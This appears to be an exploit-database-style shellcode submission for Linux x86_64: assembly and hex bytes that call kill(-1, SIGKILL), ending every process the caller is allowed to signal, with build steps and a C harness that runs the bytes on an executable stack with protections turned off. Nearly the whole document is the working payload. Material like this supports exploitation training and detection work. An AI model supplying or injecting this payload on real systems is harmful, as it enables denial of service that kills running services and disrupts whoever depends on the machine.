/*
;Title: Linux/x86_64 - kill() All Processes Shellcode
;Author: Touhid M.Shaikh
;Contact: https://github.com/touhidshaikh
;Category: Shellcode
;Architecture: Linux x86_64
;Description: If pid == -1, then sig is sent to every process for which the
calling process has permission to send signals, except for process 1 (init)
;Shellcode Length:  19
;Tested on :  Debian 4.9.30-2kali1 (2017-06-22) x86_64 GNU/Linux



===COMPILATION AND EXECUTION Assemmbly file===

#nasm -f elf64 shell.asm -o shell.o <=== Making Object File

#ld shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary(
https://github.com/touhidshaikh/bin2shell)

=================SHELLCODE(INTEL FORMAT)=================

section .text
global _start:
_start:
xor rax,rax
push byte -1 ; pid = -1,
pop rdi
add rax,9    ; sig
mov rsi,rax
add rax,53   ; kill system call number 9+53=62
syscall


===================END HERE============================

====================FOR C Compile===========================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x6a\xff\x5f\x48\x83\xc0\x09\x48\x89\xc6\x48\x83\xc0\x35\x0f\x05";


main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}